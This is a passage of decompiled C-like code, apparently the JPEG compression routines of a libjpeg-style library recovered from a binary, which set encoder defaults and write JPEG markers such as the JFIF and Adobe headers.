    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if (param_1[0x10] == 0) {
    iVar1 = (**(code **)param_1[1])(param_1,0,0x348);
    param_1[0x10] = iVar1;
  }
  param_1[0xd] = 8;
  FUN_0042def8(param_1,0x4b,1);
  FUN_0042df9c(param_1);
  iVar1 = 0;
  piVar2 = param_1 + 0x1d;
  do {
    *(undefined *)piVar2 = 0;
    *(undefined *)(piVar2 + 4) = 1;
    *(undefined *)(piVar2 + 8) = 5;
    iVar1 = iVar1 + 1;
    piVar2 = (int *)((int)piVar2 + 1);
  } while (iVar1 < 0x10);
  param_1[0x2a] = 0;
  param_1[0x29] = 0;
  param_1[0x2b] = 0;
  param_1[0x2c] = 0;
  param_1[0x2d] = 0;
  if (8 < param_1[0xd]) {
    param_1[0x2d] = 1;
  }
  param_1[0x2e] = 0;
  param_1[0x2f] = 0;
  param_1[0x30] = 2;
  param_1[0x31] = 0;
  param_1[0x32] = 0;
  *(undefined *)(param_1 + 0x34) = 1;
  *(undefined *)((int)param_1 + 0xd1) = 1;
  *(undefined *)((int)param_1 + 0xd2) = 0;
  *(undefined2 *)(param_1 + 0x35) = 1;
  *(undefined2 *)((int)param_1 + 0xd6) = 1;
  FUN_0042e0f4(param_1);
  return;
}



void FUN_0042e0f4(int *param_1)

{
  switch(param_1[10]) {
  case 0:
    FUN_0042e168(param_1,0);
    return;
  case 1:
    FUN_0042e168(param_1,1);
    return;
  case 2:
    FUN_0042e168(param_1,3);
    return;
  case 3:
    FUN_0042e168(param_1,3);
    return;
  case 4:
    FUN_0042e168(param_1,4);
    return;
  case 5:
    FUN_0042e168(param_1,5);
    return;
  default:
    *(undefined4 *)(*param_1 + 0x14) = 9;
    (**(code **)*param_1)();
    return;
  }
}



void FUN_0042e168(int *param_1,int param_2)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  
  if (param_1[5] != 100) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x14;
    *(int *)(iVar3 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  param_1[0xf] = param_2;
  param_1[0x33] = 0;
  param_1[0x36] = 0;
  switch(param_2) {
  case 0:
    param_1[0xe] = param_1[9];
    if ((param_1[0xe] < 1) || (10 < param_1[0xe])) {
      iVar3 = *param_1;
      *(undefined4 *)(iVar3 + 0x14) = 0x1a;
      *(int *)(iVar3 + 0x18) = param_1[0xe];
      *(undefined4 *)(iVar3 + 0x1c) = 10;
      (**(code **)*param_1)();
    }
    for (iVar3 = 0; iVar3 < param_1[0xe]; iVar3 = iVar3 + 1) {
      piVar2 = (int *)(iVar3 * 0x54 + param_1[0x10]);
      *piVar2 = iVar3;
      piVar2[2] = 1;
      piVar2[3] = 1;
      piVar2[4] = 0;
      piVar2[5] = 0;
      piVar2[6] = 0;
    }
    return;
  case 1:
    param_1[0x33] = 1;
    param_1[0xe] = 1;
    puVar1 = (undefined4 *)param_1[0x10];
    *puVar1 = 1;
    puVar1[2] = 1;
    puVar1[3] = 1;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    return;
  case 2:
    param_1[0x36] = 1;
    param_1[0xe] = 3;
    puVar1 = (undefined4 *)param_1[0x10];
    *puVar1 = 0x52;
    puVar1[2] = 1;
    puVar1[3] = 1;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0x54) = 0x47;
    *(undefined4 *)(iVar3 + 0x5c) = 1;
    *(undefined4 *)(iVar3 + 0x60) = 1;
    *(undefined4 *)(iVar3 + 100) = 0;
    *(undefined4 *)(iVar3 + 0x68) = 0;
    *(undefined4 *)(iVar3 + 0x6c) = 0;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0xa8) = 0x42;
    *(undefined4 *)(iVar3 + 0xb0) = 1;
    *(undefined4 *)(iVar3 + 0xb4) = 1;
    *(undefined4 *)(iVar3 + 0xb8) = 0;
    *(undefined4 *)(iVar3 + 0xbc) = 0;
    *(undefined4 *)(iVar3 + 0xc0) = 0;
    return;
  case 3:
    param_1[0x33] = 1;
    param_1[0xe] = 3;
    puVar1 = (undefined4 *)param_1[0x10];
    *puVar1 = 1;
    puVar1[2] = 2;
    puVar1[3] = 2;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0x54) = 2;
    *(undefined4 *)(iVar3 + 0x5c) = 1;
    *(undefined4 *)(iVar3 + 0x60) = 1;
    *(undefined4 *)(iVar3 + 100) = 1;
    *(undefined4 *)(iVar3 + 0x68) = 1;
    *(undefined4 *)(iVar3 + 0x6c) = 1;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0xa8) = 3;
    *(undefined4 *)(iVar3 + 0xb0) = 1;
    *(undefined4 *)(iVar3 + 0xb4) = 1;
    *(undefined4 *)(iVar3 + 0xb8) = 1;
    *(undefined4 *)(iVar3 + 0xbc) = 1;
    *(undefined4 *)(iVar3 + 0xc0) = 1;
    return;
  case 4:
    param_1[0x36] = 1;
    param_1[0xe] = 4;
    puVar1 = (undefined4 *)param_1[0x10];
    *puVar1 = 0x43;
    puVar1[2] = 1;
    puVar1[3] = 1;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0x54) = 0x4d;
    *(undefined4 *)(iVar3 + 0x5c) = 1;
    *(undefined4 *)(iVar3 + 0x60) = 1;
    *(undefined4 *)(iVar3 + 100) = 0;
    *(undefined4 *)(iVar3 + 0x68) = 0;
    *(undefined4 *)(iVar3 + 0x6c) = 0;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0xa8) = 0x59;
    *(undefined4 *)(iVar3 + 0xb0) = 1;
    *(undefined4 *)(iVar3 + 0xb4) = 1;
    *(undefined4 *)(iVar3 + 0xb8) = 0;
    *(undefined4 *)(iVar3 + 0xbc) = 0;
    *(undefined4 *)(iVar3 + 0xc0) = 0;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0xfc) = 0x4b;
    *(undefined4 *)(iVar3 + 0x104) = 1;
    *(undefined4 *)(iVar3 + 0x108) = 1;
    *(undefined4 *)(iVar3 + 0x10c) = 0;
    *(undefined4 *)(iVar3 + 0x110) = 0;
    *(undefined4 *)(iVar3 + 0x114) = 0;
    return;
  case 5:
    param_1[0x36] = 1;
    param_1[0xe] = 4;
    puVar1 = (undefined4 *)param_1[0x10];
    *puVar1 = 1;
    puVar1[2] = 2;
    puVar1[3] = 2;
    puVar1[4] = 0;
    puVar1[5] = 0;
    puVar1[6] = 0;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0x54) = 2;
    *(undefined4 *)(iVar3 + 0x5c) = 1;
    *(undefined4 *)(iVar3 + 0x60) = 1;
    *(undefined4 *)(iVar3 + 100) = 1;
    *(undefined4 *)(iVar3 + 0x68) = 1;
    *(undefined4 *)(iVar3 + 0x6c) = 1;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0xa8) = 3;
    *(undefined4 *)(iVar3 + 0xb0) = 1;
    *(undefined4 *)(iVar3 + 0xb4) = 1;
    *(undefined4 *)(iVar3 + 0xb8) = 1;
    *(undefined4 *)(iVar3 + 0xbc) = 1;
    *(undefined4 *)(iVar3 + 0xc0) = 1;
    iVar3 = param_1[0x10];
    *(undefined4 *)(iVar3 + 0xfc) = 4;
    *(undefined4 *)(iVar3 + 0x104) = 2;
    *(undefined4 *)(iVar3 + 0x108) = 2;
    *(undefined4 *)(iVar3 + 0x10c) = 0;
    *(undefined4 *)(iVar3 + 0x110) = 0;
    *(undefined4 *)(iVar3 + 0x114) = 0;
    return;
  default:
    *(undefined4 *)(*param_1 + 0x14) = 10;
    (**(code **)*param_1)();
    return;
  }
}



undefined4 *
FUN_0042e520(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6)

{
  *param_1 = 1;
  param_1[1] = param_2;
  param_1[5] = param_3;
  param_1[6] = param_6;
  param_1[7] = param_5;
  param_1[8] = param_4;
  return param_1 + 9;
}



void FUN_0042e548(undefined4 *param_1,int param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5,undefined4 param_6)

{
  int iVar1;
  
  iVar1 = 0;
  if (0 < param_2) {
    do {
      *param_1 = 1;
      param_1[1] = iVar1;
      param_1[5] = param_3;
      param_1[6] = param_6;
      iVar1 = iVar1 + 1;
      param_1[7] = param_5;
      param_1[8] = param_4;
      param_1 = param_1 + 9;
    } while (iVar1 < param_2);
  }
  return;
}



int * FUN_0042e584(int *param_1,int param_2,int param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  
  if (param_2 < 5) {
    *param_1 = param_2;
    iVar2 = 0;
    piVar1 = param_1 + 1;
    if (0 < param_2) {
      do {
        *piVar1 = iVar2;
        iVar2 = iVar2 + 1;
        piVar1 = piVar1 + 1;
      } while (iVar2 < param_2);
    }
    param_1[6] = 0;
    param_1[5] = 0;
    param_1[7] = param_3;
    param_1[8] = param_4;
    piVar1 = param_1 + 9;
  }
  else {
    piVar1 = (int *)FUN_0042e548(param_1,param_2,0,param_4,param_3,0);
  }
  return piVar1;
}



void FUN_0042e5d0(int *param_1)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  undefined4 *puVar4;
  int local_10;
  
  iVar1 = param_1[0xe];
  if (param_1[5] != 100) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x14;
    *(int *)(iVar2 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if ((iVar1 == 3) && (param_1[0xf] == 3)) {
    local_10 = 10;
  }
  else if (iVar1 < 5) {
    local_10 = iVar1 * 4 + 2;
  }
  else {
    local_10 = iVar1 * 6;
  }
  if ((param_1[0x5b] == 0) || (param_1[0x5c] < local_10)) {
    iVar2 = local_10;
    if (local_10 < 0xb) {
      iVar2 = 10;
    }
    param_1[0x5c] = iVar2;
    iVar2 = (**(code **)param_1[1])(param_1,0,iVar2 * 0x24);
    param_1[0x5b] = iVar2;
  }
  piVar3 = (int *)param_1[0x5b];
  param_1[0x2a] = (int)piVar3;
  param_1[0x29] = local_10;
  if ((iVar1 == 3) && (param_1[0xf] == 3)) {
    piVar3 = FUN_0042e584(piVar3,3,0,1);
    puVar4 = FUN_0042e520(piVar3,0,1,2,0,5);
    puVar4 = FUN_0042e520(puVar4,2,1,1,0,0x3f);
    puVar4 = FUN_0042e520(puVar4,1,1,1,0,0x3f);
    puVar4 = FUN_0042e520(puVar4,0,6,2,0,0x3f);
    piVar3 = FUN_0042e520(puVar4,0,1,1,2,0x3f);
    piVar3 = FUN_0042e584(piVar3,3,1,0);
    puVar4 = FUN_0042e520(piVar3,2,1,0,1,0x3f);
    puVar4 = FUN_0042e520(puVar4,1,1,0,1,0x3f);
    FUN_0042e520(puVar4,0,1,0,1,0x3f);
  }
  else {
    piVar3 = FUN_0042e584(piVar3,iVar1,0,1);
    puVar4 = (undefined4 *)FUN_0042e548(piVar3,iVar1,1,2,0,5);
    puVar4 = (undefined4 *)FUN_0042e548(puVar4,iVar1,6,2,0,0x3f);
    piVar3 = (int *)FUN_0042e548(puVar4,iVar1,1,1,2,0x3f);
    piVar3 = FUN_0042e584(piVar3,iVar1,1,0);
    FUN_0042e548(piVar3,iVar1,1,0,1,0x3f);
  }
  return;
}



void FUN_0042e7e8(int *param_1,int param_2)

{
  int iVar1;
  
  if (param_1[5] != 100) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if (param_2 != 0) {
    FUN_0042eaa0((int)param_1,0);
  }
  (**(code **)(*param_1 + 0x10))();
  (**(code **)(param_1[6] + 8))();
  FUN_0042ecdc(param_1);
  (**(code **)param_1[0x52])();
  param_1[0x37] = 0;
  if (param_1[0x2b] == 0) {
    iVar1 = 0x65;
  }
  else {
    iVar1 = 0x66;
  }
  param_1[5] = iVar1;
  return;
}



uint FUN_0042e85c(int *param_1,undefined4 param_2,uint param_3)

{
  int iVar1;
  uint local_10;
  
  local_10 = param_3;
  if (param_1[5] != 0x65) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if ((uint)param_1[8] <= (uint)param_1[0x37]) {
    *(undefined4 *)(*param_1 + 0x14) = 0x7b;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
  }
  iVar1 = param_1[2];
  if (iVar1 != 0) {
    *(int *)(iVar1 + 4) = param_1[0x37];
    *(int *)(iVar1 + 8) = param_1[8];
    (**(code **)param_1[2])();
  }
  if (*(int *)(param_1[0x52] + 0xc) != 0) {
    (**(code **)(param_1[0x52] + 4))();
  }
  if ((uint)(param_1[8] - param_1[0x37]) < param_3) {
    param_3 = param_1[8] - param_1[0x37];
  }
  local_10 = 0;
  (**(code **)(param_1[0x53] + 4))(param_1,param_2,&local_10);
  param_1[0x37] = param_1[0x37] + param_3;
  return param_3;
}



uint FUN_0042e90c(int *param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  int iVar2;
  
  if (param_1[5] != 0x66) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x14;
    *(int *)(iVar2 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if ((uint)param_1[0x37] < (uint)param_1[8]) {
    iVar2 = param_1[2];
    if (iVar2 != 0) {
      *(int *)(iVar2 + 4) = param_1[0x37];
      *(int *)(iVar2 + 8) = param_1[8];
      (**(code **)param_1[2])();
    }
    if (*(int *)(param_1[0x52] + 0xc) != 0) {
      (**(code **)(param_1[0x52] + 4))();
    }
    uVar1 = param_1[0x3a] * 8;
    if (param_3 < uVar1) {
      *(undefined4 *)(*param_1 + 0x14) = 0x17;
      (**(code **)*param_1)();
    }
    iVar2 = (**(code **)(param_1[0x55] + 4))(param_1,param_2);
    if (iVar2 == 0) {
      uVar1 = 0;
    }
    else {
      param_1[0x37] = param_1[0x37] + uVar1;
    }
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 0x7b;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_0042e9c8(int *param_1,int param_2,int param_3)

{
  int iVar1;
  undefined uVar2;
  int iVar3;
  undefined uVar4;
  undefined extraout_CL;
  int extraout_ECX;
  undefined uVar5;
  undefined extraout_DL;
  int extraout_EDX;
  int *piVar6;
  
  uVar2 = 0;
  param_1[1] = 0;
  iVar3 = param_3;
  if (param_2 != 0x3e) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0xc;
    *(undefined4 *)(iVar3 + 0x18) = 0x3e;
    *(int *)(iVar3 + 0x1c) = param_2;
    uVar2 = (**(code **)*param_1)();
    iVar3 = extraout_ECX;
    param_2 = extraout_EDX;
  }
  uVar5 = (undefined)param_2;
  uVar4 = (undefined)iVar3;
  if (param_3 != 0x174) {
    iVar3 = *param_1;
    *(undefined4 *)(iVar3 + 0x14) = 0x15;
    *(undefined4 *)(iVar3 + 0x18) = 0x174;
    *(int *)(iVar3 + 0x1c) = param_3;
    uVar2 = (**(code **)*param_1)();
    uVar4 = extraout_CL;
    uVar5 = extraout_DL;
  }
  iVar3 = *param_1;
  iVar1 = param_1[3];
  FUN_00420fb0(uVar2,uVar5,uVar4,param_1,0,0x174);
  *param_1 = iVar3;
  param_1[3] = iVar1;
  param_1[4] = 0;
  FUN_004234a0(param_1);
  param_1[2] = 0;
  param_1[6] = 0;
  piVar6 = param_1 + 0x11;
  param_1[0x10] = 0;
  iVar3 = 0;
  do {
    iVar3 = iVar3 + 1;
    *piVar6 = 0;
    piVar6 = piVar6 + 1;
  } while (iVar3 < 4);
  iVar3 = 0;
  piVar6 = param_1 + 0x15;
  do {
    iVar3 = iVar3 + 1;
    *piVar6 = 0;
    piVar6[4] = 0;
    piVar6 = piVar6 + 1;
  } while (iVar3 < 4);
  param_1[0x5b] = 0;
  param_1[0xb] = 0;
  param_1[0xc] = 0x3ff00000;
  param_1[5] = 100;
  return;
}



void FUN_0042eaa0(int param_1,undefined4 param_2)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = 0;
  piVar1 = (int *)(param_1 + 0x44);
  do {
    if (*piVar1 != 0) {
      *(undefined4 *)(*piVar1 + 0x80) = param_2;
    }
    iVar2 = iVar2 + 1;
    piVar1 = piVar1 + 1;
  } while (iVar2 < 4);
  iVar2 = 0;
  piVar1 = (int *)(param_1 + 0x54);
  do {
    if (*piVar1 != 0) {
      *(undefined4 *)(*piVar1 + 0x114) = param_2;
    }
    if (piVar1[4] != 0) {
      *(undefined4 *)(piVar1[4] + 0x114) = param_2;
    }
    iVar2 = iVar2 + 1;
    piVar1 = piVar1 + 1;
  } while (iVar2 < 4);
  return;
}



void FUN_0042eae8(int *param_1)

{
  int iVar1;
  uint uVar2;
  
  if ((param_1[5] == 0x65) || (param_1[5] == 0x66)) {
    if ((uint)param_1[0x37] < (uint)param_1[8]) {
      *(undefined4 *)(*param_1 + 0x14) = 0x43;
      (**(code **)*param_1)();
    }
    (**(code **)(param_1[0x52] + 8))();
  }
  else if (param_1[5] != 0x67) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  while (*(int *)(param_1[0x52] + 0x10) == 0) {
    (**(code **)param_1[0x52])();
    for (uVar2 = 0; uVar2 < (uint)param_1[0x3b]; uVar2 = uVar2 + 1) {
      iVar1 = param_1[2];
      if (iVar1 != 0) {
        *(uint *)(iVar1 + 4) = uVar2;
        *(int *)(iVar1 + 8) = param_1[0x3b];
        (**(code **)param_1[2])();
      }
      iVar1 = (**(code **)(param_1[0x55] + 4))(param_1,0);
      if (iVar1 == 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x18;
        (**(code **)*param_1)();
      }
    }
    (**(code **)(param_1[0x52] + 8))();
  }
  (**(code **)(param_1[0x56] + 0xc))();
  (**(code **)(param_1[6] + 0x10))();
  FUN_0042dc3c((int)param_1);
  return;
}



void FUN_0042ebc4(int *param_1,undefined4 param_2,undefined *param_3,int param_4)

{
  int iVar1;
  code *pcVar2;
  
  if ((param_1[0x37] != 0) ||
     (((iVar1 = param_1[5], iVar1 != 0x65 && (iVar1 != 0x66)) && (iVar1 != 0x67)))) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  (**(code **)(param_1[0x56] + 0x14))(param_1,param_2,param_4);
  pcVar2 = *(code **)(param_1[0x56] + 0x18);
  while( true ) {
    if (param_4 == 0) break;
    (*pcVar2)(param_1,*param_3);
    param_3 = param_3 + 1;
    param_4 = param_4 + -1;
  }
  return;
}



void FUN_0042ec38(int *param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  
  if ((param_1[0x37] != 0) ||
     (((iVar1 = param_1[5], iVar1 != 0x65 && (iVar1 != 0x66)) && (iVar1 != 0x67)))) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  (**(code **)(param_1[0x56] + 0x14))(param_1,param_2,param_3);
  return;
}



void FUN_0042ec90(int *param_1)

{
  int iVar1;
  
  if (param_1[5] != 100) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  (**(code **)(*param_1 + 0x10))();
  (**(code **)(param_1[6] + 8))();
  FUN_0042f55c((int)param_1);
  (**(code **)(param_1[0x56] + 0x10))();
  (**(code **)(param_1[6] + 0x10))();
  return;
}



void FUN_0042ecdc(int *param_1)

{
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar1;
  
  FUN_00430018(param_1,0);
  if (param_1[0x2b] == 0) {
    FUN_004313b8(param_1);
    FUN_00431da4(param_1);
    FUN_004306d0(param_1,0,extraout_ECX);
  }
  FUN_004323c8(param_1);
  if (param_1[0x2c] == 0) {
    if (param_1[0x38] == 0) {
      FUN_0043410c((int)param_1);
    }
    else {
      FUN_00432ed4((int)param_1);
    }
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 1;
    (**(code **)*param_1)();
  }
  if ((param_1[0x29] < 2) && (param_1[0x2d] == 0)) {
    iVar1 = 0;
  }
  else {
    iVar1 = 1;
  }
  FUN_00430eb4((int)param_1,iVar1);
  FUN_004301b8(param_1,0,extraout_ECX_00);
  FUN_0042f55c((int)param_1);
  (**(code **)(param_1[1] + 0x18))();
  (**(code **)param_1[0x56])();
  return;
}



void FUN_0042ed88(int *param_1,undefined param_2)

{
  int *piVar1;
  int *piVar2;
  undefined *puVar3;
  int iVar4;
  
  piVar2 = (int *)param_1[6];
  puVar3 = (undefined *)*piVar2;
  *piVar2 = *piVar2 + 1;
  *puVar3 = param_2;
  piVar1 = piVar2 + 1;
  *piVar1 = *piVar1 + -1;
  if (*piVar1 == 0) {
    iVar4 = (*(code *)piVar2[3])(param_1);
    if (iVar4 == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 0x18;
      (**(code **)*param_1)();
    }
  }
  return;
}



void FUN_0042edb8(int *param_1,undefined param_2)

{
  FUN_0042ed88(param_1,0xff);
  FUN_0042ed88(param_1,param_2);
  return;
}



void FUN_0042edd8(int *param_1,undefined4 param_2)

{
  FUN_0042ed88(param_1,(char)((uint)param_2 >> 8));
  FUN_0042ed88(param_1,(char)param_2);
  return;
}



int FUN_0042ee04(int *param_1,int param_2)

{
  ushort uVar1;
  ushort *puVar2;
  ushort *puVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  int *local_14;
  
  puVar2 = (ushort *)param_1[param_2 + 0x11];
  if (puVar2 == (ushort *)0x0) {
    iVar5 = *param_1;
    *(undefined4 *)(iVar5 + 0x14) = 0x34;
    *(int *)(iVar5 + 0x18) = param_2;
    (**(code **)*param_1)();
  }
  iVar6 = 0;
  iVar5 = 0;
  puVar3 = puVar2;
  do {
    if (0xff < *puVar3) {
      iVar6 = 1;
    }
    iVar5 = iVar5 + 1;
    puVar3 = puVar3 + 1;
  } while (iVar5 < 0x40);
  if (*(int *)(puVar2 + 0x40) == 0) {
    FUN_0042edb8(param_1,0xdb);
    if (iVar6 == 0) {
      uVar4 = 0x43;
    }
    else {
      uVar4 = 0x83;
    }
    FUN_0042edd8(param_1,uVar4);
    FUN_0042ed88(param_1,(char)(iVar6 << 4) + (char)param_2);
    local_14 = &DAT_00440da8;
    iVar5 = 0;
    do {
      uVar1 = puVar2[*local_14];
      if (iVar6 != 0) {
        FUN_0042ed88(param_1,(char)((uint)uVar1 >> 8));
      }
      FUN_0042ed88(param_1,(char)uVar1);
      iVar5 = iVar5 + 1;
      local_14 = local_14 + 1;
    } while (iVar5 < 0x40);
    *(undefined4 *)(puVar2 + 0x40) = 1;
  }
  return iVar6;
}



void FUN_0042eee8(int *param_1,int param_2,int param_3)

{
  byte *pbVar1;
  int iVar2;
  int iVar3;
  byte *pbVar4;
  int local_1c;
  byte *local_18;
  byte *local_14;
  
  if (param_3 == 0) {
    pbVar4 = (byte *)param_1[param_2 + 0x15];
    local_1c = param_2;
  }
  else {
    pbVar4 = (byte *)param_1[param_2 + 0x19];
    local_1c = param_2 + 0x10;
  }
  if (pbVar4 == (byte *)0x0) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x32;
    *(int *)(iVar2 + 0x18) = local_1c;
    (**(code **)*param_1)();
  }
  if (*(int *)(pbVar4 + 0x114) == 0) {
    FUN_0042edb8(param_1,0xc4);
    iVar3 = 0;
    iVar2 = 1;
    pbVar1 = pbVar4;
    do {
      pbVar1 = pbVar1 + 1;
      iVar2 = iVar2 + 1;
      iVar3 = iVar3 + (uint)*pbVar1;
    } while (iVar2 < 0x11);
    FUN_0042edd8(param_1,iVar3 + 0x13);
    FUN_0042ed88(param_1,(char)local_1c);
    iVar2 = 1;
    local_18 = pbVar4;
    do {
      local_18 = local_18 + 1;
      FUN_0042ed88(param_1,*local_18);
      iVar2 = iVar2 + 1;
    } while (iVar2 < 0x11);
    iVar2 = 0;
    local_14 = pbVar4 + 0x11;
    if (0 < iVar3) {
      do {
        FUN_0042ed88(param_1,*local_14);
        iVar2 = iVar2 + 1;
        local_14 = local_14 + 1;
      } while (iVar2 < iVar3);
    }
    *(undefined4 *)(pbVar4 + 0x114) = 1;
  }
  return;
}



void FUN_0042efc4(void)

{
  return;
}



void FUN_0042efc8(int *param_1)

{
  FUN_0042edb8(param_1,0xdd);
  FUN_0042edd8(param_1,4);
  FUN_0042edd8(param_1,param_1[0x31]);
  return;
}



void FUN_0042eff4(int *param_1,undefined param_2)

{
  undefined4 *puVar1;
  int iVar2;
  
  FUN_0042edb8(param_1,param_2);
  FUN_0042edd8(param_1,param_1[0xe] * 3 + 8);
  if ((0xffff < param_1[8]) || (0xffff < param_1[7])) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x29;
    *(undefined4 *)(iVar2 + 0x18) = 0xffff;
    (**(code **)*param_1)();
  }
  FUN_0042ed88(param_1,(char)param_1[0xd]);
  FUN_0042edd8(param_1,param_1[8]);
  FUN_0042edd8(param_1,param_1[7]);
  FUN_0042ed88(param_1,(char)param_1[0xe]);
  puVar1 = (undefined4 *)param_1[0x10];
  for (iVar2 = 0; iVar2 < param_1[0xe]; iVar2 = iVar2 + 1) {
    FUN_0042ed88(param_1,(char)*puVar1);
    FUN_0042ed88(param_1,(char)(puVar1[2] << 4) + (char)puVar1[3]);
    FUN_0042ed88(param_1,(char)puVar1[4]);
    puVar1 = puVar1 + 0x15;
  }
  return;
}



void FUN_0042f098(int *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  char cVar3;
  int iVar4;
  int *piVar5;
  
  FUN_0042edb8(param_1,0xda);
  FUN_0042edd8(param_1,param_1[0x3c] * 2 + 6);
  FUN_0042ed88(param_1,(char)param_1[0x3c]);
  piVar5 = param_1 + 0x3d;
  for (iVar4 = 0; iVar4 < param_1[0x3c]; iVar4 = iVar4 + 1) {
    puVar1 = (undefined4 *)*piVar5;
    FUN_0042ed88(param_1,(char)*puVar1);
    iVar2 = puVar1[5];
    cVar3 = (char)puVar1[6];
    if (param_1[0x38] != 0) {
      if (param_1[0x4e] == 0) {
        cVar3 = '\0';
        if ((param_1[0x50] != 0) && (param_1[0x2c] == 0)) {
          iVar2 = 0;
        }
      }
      else {
        iVar2 = 0;
      }
    }
    FUN_0042ed88(param_1,cVar3 + (char)(iVar2 << 4));
    piVar5 = piVar5 + 1;
  }
  FUN_0042ed88(param_1,(char)param_1[0x4e]);
  FUN_0042ed88(param_1,(char)param_1[0x4f]);
  FUN_0042ed88(param_1,(char)(param_1[0x50] << 4) + (char)param_1[0x51]);
  return;
}



void FUN_0042f160(int *param_1)

{
  FUN_0042edb8(param_1,0xe0);
  FUN_0042edd8(param_1,0x10);
  FUN_0042ed88(param_1,0x4a);
  FUN_0042ed88(param_1,0x46);
  FUN_0042ed88(param_1,0x49);
  FUN_0042ed88(param_1,0x46);
  FUN_0042ed88(param_1,0);
  FUN_0042ed88(param_1,*(undefined *)(param_1 + 0x34));
  FUN_0042ed88(param_1,*(undefined *)((int)param_1 + 0xd1));
  FUN_0042ed88(param_1,*(undefined *)((int)param_1 + 0xd2));
  FUN_0042edd8(param_1,(uint)*(ushort *)(param_1 + 0x35));
  FUN_0042edd8(param_1,(uint)*(ushort *)((int)param_1 + 0xd6));
  FUN_0042ed88(param_1,0);
  FUN_0042ed88(param_1,0);
  return;
}



void FUN_0042f214(int *param_1)

{
  FUN_0042edb8(param_1,0xee);
  FUN_0042edd8(param_1,0xe);
  FUN_0042ed88(param_1,0x41);
  FUN_0042ed88(param_1,100);
  FUN_0042ed88(param_1,0x6f);
  FUN_0042ed88(param_1,0x62);
  FUN_0042ed88(param_1,0x65);
  FUN_0042edd8(param_1,100);
  FUN_0042edd8(param_1,0);
  FUN_0042edd8(param_1,0);
  if (param_1[0xf] == 3) {
    FUN_0042ed88(param_1,1);
    return;
  }
  if (param_1[0xf] != 5) {
    FUN_0042ed88(param_1,0);
    return;
  }
  FUN_0042ed88(param_1,2);
  return;
}



void FUN_0042f2c0(int *param_1,undefined param_2,uint param_3)

{
  if (0xfffd < param_3) {
    *(undefined4 *)(*param_1 + 0x14) = 0xb;
    (**(code **)*param_1)();
  }
  FUN_0042edb8(param_1,param_2);
  FUN_0042edd8(param_1,param_3 + 2);
  return;
}



void FUN_0042f300(int *param_1)

{
  int iVar1;
  
  iVar1 = param_1[0x56];
  FUN_0042edb8(param_1,0xd8);
  *(undefined4 *)(iVar1 + 0x1c) = 0;
  if (param_1[0x33] != 0) {
    FUN_0042f160(param_1);
  }
  if (param_1[0x36] != 0) {
    FUN_0042f214(param_1);
  }
  return;
}



void FUN_0042f340(int *param_1)

{
  bool bVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int local_14;
  
  local_14 = 0;
  iVar3 = param_1[0x10];
  for (iVar4 = 0; iVar4 < param_1[0xe]; iVar4 = iVar4 + 1) {
